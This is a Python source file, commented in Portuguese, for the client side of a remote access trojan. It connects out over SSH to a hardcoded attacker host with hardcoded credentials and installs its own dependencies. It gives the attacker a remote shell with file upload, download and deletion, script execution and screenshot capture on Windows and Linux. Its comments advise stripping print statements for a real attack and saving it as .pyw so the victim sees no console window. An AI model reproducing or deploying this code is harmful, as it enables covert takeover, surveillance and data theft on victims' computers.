from time import *
import sys
import os
import pdb
import subprocess

try:
	import paramiko
except ImportError:
	try:
		os.system("pip install paramiko")
	except:
		os.system("pip3 install paramiko")
finally:
	import paramiko

#try:
try:
	os.system("pip install pyscreenshot --user")
except:
	os.system("pip install pyscreenshot")

try:
        os.system("pip install pillow")
except:
        os.system("pip install pillow --user")

import pyscreenshot as pst

## TODAS AS INSTRUÇÕES "PRINT" são aconselhaveis apaga-las em um ataque real, uma vez que a target machine não tem a necessidade, e pode ate ser perigoso para o ataque, uma vez que o target saberia que esta sendo atacado

## SALVAR A FILE EM MODO example.pyw, adicionando apenas um 'w' no final da extensao '.py' dizendo ao bin python para usar o pythonw.exe, no qual o prompt de comando windows e/ou terminal linux, não sera ativado.

########## imports #################

### login settings #######
password = "paraquedas123@" ## SSH PASS
username = "rablidad"	## SSH Username
ip = "192.168.1.31"  # direcionamento de porta ip externo é necessario para ataques exteriores a lan	## SSH HOSTNAME (IPV4)
#####LOGIN SETTINGS#########
###########################
foto = 1
###########################

##### FUNCTIONS DECLARATIONS ########

def windows_shell(sshcliente):
	global foto
	while True:
		wcmd = sshcliente.recv(1024).decode('utf-8')
		print(wcmd)
		try:
			if(wcmd == 'exit'):
				main()
			elif(wcmd[:2] == 'cd'):
				try:
					os.chdir(wcmd[3:])
					sshcliente.send(os.getcwd())
				except os.error as xx:
					sshcliente.send("[-] Client-Side Erro: " + str(xx))
			else:
				if wcmd == 'pwd':
					try:
						sshcliente.send(os.getcwd())
					except os.error as b:
						sshcliente.send("[-] Client-Side Error: " + str(b))
				elif(wcmd[:5] == "start"):
					try:
						browser_output = subprocess.Popen(wcmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
						brows = browser_output.stdout.read() + browser_output.stderr.read()
						sshcliente.send("[+] Opening: Firefox/Chrome on Client.")
					except subprocess.CalledProcessError as xxx:
						sshcliente.send("[-] Client-Side Error: " + str(xxx))
				else:
					if(wcmd[:3] == "del" or wcmd[:2] == "rm"):
						try:
							os.system(wcmd)
							sshcliente.send("[+] Arquivo Deletado: " + wcmd)
						except os.error as file_del:
							sshcliente.send("[-] Cliente side Error: " + str(file_del))
					else:
						if(wcmd[:4] == 'sndf'):
							file_buffer = sshcliente.recv(65536).decode('ISO-8859-1')
							if file_buffer == 'error':
								continue
							elif file_buffer != 'error':
								try:
									with open(wcmd[5:], 'w+') as file_to_create:
										file_to_create.write(file_buffer)
										sshcliente.send("[+] Arquivo Criado.")	
								except Exception as file_error:
									sshcliente.send("[-] Não Foi possivel criar o arquivo.")

						elif(wcmd[:4] == "getf"):
							try:
								with open(wcmd[5:], 'r') as file_to_read:
									sshcliente.send("ok")
									file_buffer = file_to_read.read()
									sshcliente.send(file_buffer)
							except Exception as poli:
								sshcliente.send("[-] Cliente-Side Error: " + str(poli))
							else:
								sshcliente.send("[+] Enviando: " + wcmd[5:])
						elif(wcmd == "python" or wcmd == "python3"):
							path_file_to_execute = str(sshcliente.recv(2046).decode('utf-8'))
							print(path_file_to_execute)
							executavel = str(sys.executable)
							try:
								if(wcmd == 'python'):
									os.execvp(executavel, ("python", str(path_file_to_execute)))
								elif(wcmd == "python3"):
									os.execvp(executavel, ("python3", str(path_file_to_execute)))
							except os.error as paaaa:
								sshcliente.send("[-] Cliente-Side Error: " + str(paaaa))
						else:
							if(wcmd == 'screenshot'):
								pasta = sshcliente.recv(1024).decode('utf-8')
								image = pst.grab()
								image.save("C:\\Users\\"+ str(pasta) +"\\screenshot" + str(foto) + ".png")
								try:
									with open("C:\\Users\\"+ str(pasta) +"\\screenshot" + str(foto) + ".png", 'rb') as foto_send:
										sshcliente.send("ok")
										foto_buf = foto_send.read()
										foto_len = str(foto_buf)
										foto_len2 = str(len(foto_len))
										print(foto_len2)
										sshcliente.send(foto_len2)
										print("enviando sendall")
										
										sshcliente.sendall(foto_buf)
											
									foto+=1
								except Exception as bah:
									sshcliente.send("[+] Cliente-Side Error: " + str(bah))
							else:
								try:
									output_error = subprocess.Popen(wcmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
									exec_output = str(output_error.stdout.read().decode('ISO-8859-1')) + str(output_error.stderr.read().decode('ISO-8859-1'))
									print(exec_output)
									sshcliente.send(exec_output)
								except subprocess.CalledProcessError as eeee:
									sshcliente.send("[-] Client-Side Error: " + str(eeee))
		except Exception as ee:
			sshcliente.send("[-] Client-Side Error: " + str(ee))

def linux_shell(sshcliente):
	while True:
		scmd = sshcliente.recv(1024).decode('utf-8')
		print(scmd)
		try:
			if scmd == 'exit':	
				main()
			elif scmd[:2] == 'cd':
				try:
					os.chdir(scmd[3:])
					sshcliente.send(os.getcwd())
				except os.error as err:
					sshcliente.send("[-] Client-Side Error: " + str(err))
			else:
				if(scmd[:7] == 'firefox' or scmd[:13] == 'google-chrome'):
					try:
						brow = subprocess.Popen(scmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
						cmd_outerr = brow.stdout.read() + brow.stderr.read()
						if len(cmd_outerr):
							sshcliente.send(cmd_outerr)
						else:
							sshcliente.send("[+] Opening: Firefox/Chrome on Client")
					except subprocess.CalledProcessError as xxxx:
						sshcliente.send("[-] Client-Side Error: " + str(xxxx))
				else:
					try:
						cmd_out = subprocess.Popen(scmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
						output = cmd_out.stdout.read() + cmd_out.stderr.read()
						sshcliente.send(output)
					except subprocess.CalledProcessError as err:
						sshcliente.send("[-] Client-Side Error: " + str(err))
		except Exception as ae:
			sshcliente.send("[-] Client-Side Error: " + str(ae))

def re_connect():
	cliente = paramiko.SSHClient()
	cliente.load_system_host_keys()
	cliente.set_missing_host_key_policy(paramiko.AutoAddPolicy())
	while True:
		try:
			print("Conectando-se")
			cliente.connect(hostname = ip, username = username, password = password, port = 5555)
		except:
			print("---\n Reiniciando, tentando novamente em 10 segundos.\n---")
			sleep(10)
		else:
			return cliente		


def main():
	cliente = re_connect()
	sshcliente = cliente.get_transport().open_session()
	if sshcliente.active:
		sshcliente.send(sys.platform)
		if sys.platform == 'win32' or sys.platform == 'cygwin':
			windows_shell(sshcliente)
		else:
			linux_shell(sshcliente)


main()
